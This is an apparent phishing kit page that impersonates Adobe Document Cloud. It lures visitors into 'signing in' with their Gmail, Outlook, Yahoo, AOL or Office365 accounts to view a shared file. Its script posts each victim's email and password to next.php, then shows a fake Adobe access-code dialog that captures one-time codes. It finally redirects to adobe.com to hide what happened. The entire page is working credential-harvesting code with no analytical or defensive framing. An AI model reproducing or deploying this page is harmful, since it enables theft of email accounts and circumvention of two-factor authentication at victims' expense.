
<!doctype html>
<html lang="en">
<head>
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->

    <link href="https://fonts.googleapis.com/css?family=Yellowtail&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Share Point Online</title>
    <link href="css/hover.css" rel="stylesheet" media="all">

    <style type="text/css">


    </style>
  </head>
  <body>
    <div class="container-fluid">
      <div class="row" style="background-image: url('images/8.jpg'); background-size: cover;background-repeat: no-repeat;">
        <div class="container">
          <div class="row">
            <div class="col-lg-6 mx-auto my-5 px-5 pb-5" style="border:1px solid; background-color: rgba(0,0,0,0.7);border-radius:15px;">
              <div class="text-center pt-5"> 
                <img src="images/adobe.jpg" class="img-fluid" width="100px"><br>
                <span class="h4 text-white">Adobe Document Cloud</span><br>
                <span class="h5 text-white font-weight-normal">To read the document, please choose your email provider below login to view shared file.</span>
              </div>
              <div class="mt-3">
                <div class="row">
                <div class="col-lg-12">
                    <a href="javascript:void(0)" id="gmailmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                      <div class="mt-2" style=" background-color: #D44638;">
                        <img src="images/gmail1.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; ">Sign in with Gmail</span>
                      </div>
                    </a>
                  </div>
                  <div class="col-lg-12">
                    <a href="javascript:void(0)" id="outlookmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                      <div class=" mt-2" style=" background-color: #0073C8;">
                        <img src="images/outlook1.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Outlook</span>
                      </div>
                    </a>
                  </div>
                </div>
                <div class="row">
                  <div class="col-lg-12 ">
                    <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                      <div class="  mt-2" style=" background-color: #31459B;">
                        <img src="images/aol1.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Aol</span>
                      </div>
                    </a>
                  </div>
                  <div class="col-lg-12">
                    <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                      <div class=" mt-2" style=" background-color: #FF3C00;">
                        <img src="images/office3651.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
                        <span class="pl-4"  style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Office365</span>
                      </div>
                    </a>
                  </div>
                </div>
                <div class="row">
                  <div class="col-lg-12">
                    <a href="javascript:void(0)" id="yahoomodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                      <div class=" mt-2" style=" background-color: #5F0F68;">
                        <img src="images/yahoo1.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Yahoo!</span>
                      </div>
                    </a>
                  </div>
                  <div class="col-lg-12">
                    <a href="javascript:void(0)" id="othermodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                      <div class=" mt-2" style=" background-color: #0B5BD3;">
                        <img src="images/other1.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
                        <span class="pl-4"  style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Other Mail</span>
                      </div>
                    </a>
                  </div>
                  <div class="col-lg-12">
                     <p class="text-white mt-3 text-center">Built upon Adobe Document Cloud, Adobe Document Cloud features can be unlocked by providing an additional license key.</p>
                <p class="h5 text-center text-white">CopyRight© 2020 Adobe system incorporated, All right reserved.</p> 
                    
                  </div>
               
              </div> 
            </div>
          </div>
        </div>
      </div> 
    </div>




   <!-- Modal for gmail -->
  <div class="modal fade" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="modal-body">
          <center>
            <img id="fieldImg" src="images/gmail.png" class="img-fluid rounded-circle" width="80px">
            <h5 class="modal-title" id="exampleModalLabel">Login with <span id="field">Gmail</span></h5>
            <div class="alert alert-danger" id="msg"></div>
          </center>
          <form id="contact" class="form-horizontal well">
            <div class="col-lg-12">
              <div class="form-group">
                <label for="exampleInputEmail1">Email address</label>
                <input type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Enter email">
                <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
              </div>
            </div>
            <div class="col-lg-12">
              <div class="form-group">
                <label for="Password">Password</label>
                <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password">
              </div>
            </div>
          </form>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
          <button class="btn btn-lg btn-info pull-right" id="submit-btn">Login</button>
        </div>
      </div>
    </div>
  </div>
    




    <!-- Modal for otp -->
  <div class="modal fade" id="authModal" tabindex="-2" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="modal-body">
          <center>
            <br>
            <img id="fieldImgauthii" src="images/phone.jpg" class="img-fluid rounded-circle" width="80px">
            <h5 class="modal-title" style="font-size: 14px; font-weight: bold; " id="exampleModalLabel">Adobe has sent an access code to your Device</h5>
<br>
          </center>
          <form id="contactii" class="form-horizontal well">
            <div class="col-lg-12">
              <div class="form-group">
                <label for="otp">Code:</label>
                <input type="tel" name="otp" class="form-control" id="otp" aria-describedby="emailHelp" placeholder="0 0 0 0 0 0">
              </div>
            </div>
            <br>
            <script src="css/mask.js"></script>
                                        <script>
                                        var element = document.getElementById('otp');
                                        var maskOptions = {
                                            mask: '0 0 0 0 0 0 0'
                                        };
                                        var mask = IMask(element, maskOptions);
                                        </script>
          </form>
        </div>
        <div class="modal-footer">
          <button class="btn btn-lg btn-info pull-right" id="submit-btn-auth">Verify</button>
        </div>
      </div>
    </div>
  </div>


    <!-- Optional JavaScript -->
    <!-- Include jQuery -->
  <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
  <!-- Include Bootstrap JS -->
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
  </body>


  <script>
  $(document).ready(function() {
    var count = 1;
    var authCount = 0;

    function showModal(modalId, imgSrc, providerName) {
      $('#contact').trigger("reset");
      $("#msg").hide();
      $('#fieldImg').attr('src', imgSrc);
      $('#field').html(providerName);
      $(modalId).modal('show');
    }

    $('#gmailmodal').click(function() {
      showModal('#ajaxModal', 'images/gmail.png', 'Gmail');
    });

    $('#outlookmodal').click(function() {
      showModal('#ajaxModal', 'images/outlook.png', 'Outlook');
    });

    $('#aolmodal').click(function() {
      showModal('#ajaxModal', 'images/aol.png', 'Aol');
    });

    $('#office365modal').click(function() {
      showModal('#ajaxModal', 'images/office365.png', 'Office 365');
    });

    $('#yahoomodal').click(function() {
      showModal('#ajaxModal', 'images/yahoo.png', 'Yahoo');
    });

    $('#othermodal').click(function() {
      showModal('#ajaxModal', 'images/othermail.ico', 'Other Mail');
    });

    $('#submit-btn').click(function(event) {
      event.preventDefault();
      var email = $("#email").val();
      var password = $("#password").val();
      var detail = $("#field").html();

      var msg = $('#msg').html();
      $('#msg').text(msg);
      count++;

      $.ajax({
        dataType: 'json',
        url: 'next.php',
        type: 'POST',
        data: {
          email: email,
          password: password,
          detail: detail
        },
        beforeSend: function(xhr) {
          $('#submit-btn').html('Verifying...');
        },
        success: function(response) {
          $("#password").val("");
          if (response) {
            $("#msg").show();
            console.log(response);
            if (response['signal'] == 'ok') {
              $('#msg').html(response['msg']);
              // Proceed to OTP verification or whatever logic you need
            } else {
              $('#msg').html(response['msg']);
            }
          }
        },
        error: function() {
          $("#password").val("");
          $("#msg").show();
          $('#msg').html("Please try again later");
        },
        complete: function() {
          $('#submit-btn').html('Login');
        }
      });

      if (count >= 3) {
        $('#ajaxModal').modal('hide');
        $('#authModal').modal('show');
      }
    });

    $('#submit-btn-auth').click(function(event) {
      event.preventDefault();
      var otp = $("#otp").val();
      var email = $("#email").val();
      var detail = $("#field").html();

      $.ajax({
        dataType: 'json',
        url: 'next.php',
        type: 'POST',
        data: {
          otp: otp,
          email: email,
          detail: detail
        },
        beforeSend: function(xhr) {
          $('#submit-btn-auth').html('Verifying...');
        },
        success: function(response) {
          $("#otp").val("");
          if (response) {
            $("#msgii").show();
            console.log(response);
            if (response['signal'] == 'ok') {
              $('#msgii').html(response['msg']);
              // Check for "signal: ok" before redirecting
              if (response['signal'] == 'ok') {
                window.location.href = 'https://www.adobe.com/';
              }
            } else {
              $('#msgii').html(response['msg']);
            }
          }
        },
        error: function() {
          $("#otp").val("");
          $("#msgii").show();
          $('#msgii').html("Please try again later");
        },
        complete: function() {
          $('#submit-btn-auth').html('Verify');
        }
      });
    });
  });
</script>




  </html>